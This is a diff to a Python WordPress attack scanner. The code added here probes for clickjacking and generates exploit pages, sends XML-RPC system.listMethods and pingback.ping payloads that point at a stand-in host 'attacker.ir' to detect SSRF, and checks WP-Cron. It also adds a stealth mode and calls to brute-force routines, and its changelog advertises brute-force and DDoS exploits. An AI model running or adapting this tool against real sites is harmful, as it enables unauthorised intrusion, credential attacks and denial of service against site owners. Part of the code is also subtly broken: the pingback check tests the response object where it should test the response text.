+    #f.close()
+    with open(cj_path, "w", encoding="utf-8") as file:
+        file.write(html_content)
+
+    print(Fore.GREEN + "[SAVED] in "+target+'\\'+output_file+Fore.WHITE)
+
+
+
+
+
+def clickjacking(cj_urls_list):
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0 Safari/537.36'}
+    print(Fore.YELLOW + '\n[CLICKJACKING]' + Fore.WHITE)
+    
+    # Debug: Print the list to verify its contents
+    #print(Fore.CYAN + "Debug: cj_urls_list =", cj_urls_list)
+    
+    for cj_url_item in cj_urls_list:
+        # Construct the full URL
+        global full_url
+        full_url = target_https + cj_url_item
+        #print(Fore.GREEN + "Checking:", full_url)
+        
+        try:
+            # Send a GET request to the URL
+            response = requests.get(full_url, headers=headers, verify=False)
+            
+            # Check for X-Frame-Options and Content-Security-Policy headers
+            x_frame_options = response.headers.get("X-Frame-Options", "").lower()
+            csp = response.headers.get("Content-Security-Policy", "").lower()
+            
+            if x_frame_options in ["deny", "sameorigin"] or "frame-ancestors" in csp:
+                #print(Fore.MAGENTA + "[SAFE] No Clickjacking vulnerability detected.")
+                pass
+            else:
+                print(Fore.GREEN + "[FOUND] Target have Clickjacking vulnerability"+Fore.WHITE,full_url)
+                vul_list.append('Clickjacking vulnerability '+Fore.WHITE+full_url)
+                clickjacking_exploit(full_url)
+        
+        except requests.RequestException as e:
+            print(Fore.RED + f"Error: {e}")
+
+
+
+#### XMLRPC
+def xmlrpc(headers):
+    print(Fore.YELLOW+"\n[XMLRPC]"+Fore.WHITE)
+    target_path = os.path.join(target, "XMLRPC-EXPLOIT.txt")
+    f=  open(target_path, "w", encoding="utf-8")
+    response = requests.get(target_https+"/xmlrpc.php",verify=False,allow_redirects=False,headers=headers)
+    #print(response.status_code)
+    #print(response.text)
+    if response.status_code == 405:
+        if 'XML-RPC server accepts POST requests only.' in response.text:
+            print(Fore.GREEN+"[FOUND]"+Fore.WHITE,"XML-RPC ENABLE")
+            print(Fore.GREEN + "[FOUND] Target have XMLRPC vulnerability"+Fore.WHITE,target_https+'/xmlrpc.php')
+            vul_list.append('XMLRPC vulnerability '+Fore.WHITE+target_https+'/xmlrpc.php')
+            xmlrpc_v = True
+    else:
+        print(Fore.RED+"[DESABLE]"+Fore.WHITE,"XML-RPC")
+        xmlrpc_v = False
+    if xmlrpc_v is True:
+        data=['<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>']
+        data2=['<methodCall><methodName>pingback.ping</methodName><params><param><value><string>'+target_https+'/</string></value></param><param><value><string>http://attacker.ir/</string></value></param></params></methodCall>']
+        xml_eploit_response = requests.post(target_https+'/xmlrpc.php',allow_redirects=False,verify=False,headers=headers,json=data)
+        if xml_eploit_response.status_code == 200:
+            if '<methodResponse>' in xml_eploit_response.text:
+                f.write("[Exploit] <methodCall><methodName>system.listMethods</methodName><params></params></methodCall>\n\n")
+                f.write(xml_eploit_response.text)
+                print(Fore.GREEN+"[Exploit]"+Fore.WHITE,"<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>")
+                print(Fore.GREEN+"[Verify]"+Fore.WHITE,xml_eploit_response.text)
+        xml_eploit_response2 = requests.post(target_https+'/xmlrpc.php',allow_redirects=False,verify=False,headers=headers,json=data2)
+        if xml_eploit_response2.status_code == 200:
+            if 'Pingback from' in xml_eploit_response2:
+                print(Fore.GREEN + "[FOUND] Target have SSRF vulnerability"+Fore.WHITE,target_https+'/xmlrpc.php')
+                vul_list.append('SSRF vulnerability '+Fore.WHITE+target_https+'/xmlrpc.php')
+    print(Fore.YELLOW+"\n[WP-CRON]"+Fore.WHITE)
+    response = requests.get(target_https+"/wp-cron.php",verify=False,allow_redirects=False,headers=headers)
+    if response.status_code == 200:
+        print(Fore.GREEN+"[FOUND]"+Fore.WHITE,"WP-CRON ENABLE")
+        print(Fore.GREEN + "[FOUND] Target have WP-CRON vulnerability"+Fore.WHITE,target_https+'/wp-cron.php')
+        vul_list.append('WP-CRON vulnerability '+Fore.WHITE+target_https+'/wp-cron.php')
+    else:
+        print(Fore.RED+"[DISABLE]"+Fore.WHITE+"WP-CRON")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+##### Becuse of Dependensies and Platform this part of code check the OS platform and deside to execute the test cases or NOT
+def more_test_case(headers):
+    plat=platform.system()
+    #print(plat)
+    if plat == "Linux":
+        sslscan()
+        #wafw00f(headers)
+        ##nmap()
+        #subfinder(headers)
+        #ffuf()
+        #wp_scan(headers)
+        #nuclei()
 
 def wordpress_case(headers,cms_detect):
     if cms_detect == 'wordpress':
@@ -1093,14 +1448,40 @@ def wordpress_case(headers,cms_detect):
         wp_register(headers)
         wp_install(headers)
         wp_plugin(headers)
-        wp_user_enum(headers) # need to clean code and improvment with [list]
-        wp_bruteforce(username_list,headers)
+        wp_user_enum(headers)
+        if 'hide' in mode:
+            print(Fore.MAGENTA+'It is disabled due to stealth mode.'+Fore.WHITE)
+        else:
+            wp_bruteforce(username_list)
+            xmlrpc(headers)
 
 def info_ga(headers):
-    if all != None:
-        dork()
+    if 'all' in mode:
+        #dork()
         ipinfo(headers)
         wayback(headers)
+        
+def vul_check(http_200300_list, headers,cj_urls_list):
+    if 'hide' in mode:
+        print(Fore.MAGENTA+'It is disabled due to stealth mode.'+Fore.WHITE)
+    else:
+        try:
+            header_injection(headers)
+            http_smuggling(http_200300_list, target, target_https, headers)
+        except:
+            print(Fore.RED+'[ERROR]'+Fore.YELLOW,'HTTP Smuggling & Host Header Injection Can not execute!')
+        try:
+            clickjacking(cj_urls_list)
+        except:
+            print(Fore.RED+'[ERROR]'+Fore.YELLOW,'Click Jacking Can not execute!')
+
+
+def vul_def(vul_list):
+    print(Fore.YELLOW+"\n[Vulnerabilities]"+Fore.WHITE)
+    for vul_item in vul_list:
+        print(Fore.GREEN+"[FOUND]",Fore.RED+vul_item)
+
+
 
 clear()
 banner()
@@ -1108,17 +1489,21 @@ urllib3.disable_warnings()
 target_mkdir()
 target_check(headers)
 target_http_header(headers)
+if 'hide' in mode:
+    print(Fore.MAGENTA+'It is disabled due to stealth mode.'+Fore.WHITE)
+else:
+    waf(headers)
 cms(headers)
 backup_file(headers)
 login(headers)
 wordpress_case(headers,cms_detect)
 dir_browse(headers)
 info_ga(headers)
-error(headers)   #need to improve and use real url of the target
+error(headers)
 more_test_case(headers)
-
-
-# ['release_log.html','readme.txt','changes.txt','readme.md','README.md','README.txt','Readme.txt','Readme.md','README']
+vul_check(http_200300_list,headers ,cj_urls_list)
+vul_def(vul_list)
+# ['/release_log.html','/readme.txt','/changes.txt','/readme.md','/README.md','/README.txt','/Readme.txt','/Readme.md','/README']
 
 
 
@@ -1129,14 +1514,26 @@ more_test_case(headers)
 #webserver_discovery()
 #screenshot()
 #tech_discovery()
-#http_smugling
-#host_header_injection
+
+
+# host header injection (just header location and fix false/positive answer with cloudflare)
 
 
 
 
+# Plugin + Version (version from readm.txt of the plugin urls)
 
 
+#### Version 0.5 (Beta)
+# Add Waf Detector (Reducing dependency on middleware)
+# Http_smugling
+# Host_header_injection
+# XML-RPC Check + Bruteforce Exploit
+# WP-Corn Check + DDOS Exploit
+
+#### Version 0.4 (Beta)
+# Wordpress BruteForce
+# Improve UserEnum and Error Finder
 
 #### Version 0.3 (Beta)
 # add nuclei,sslscan,cms_discovery
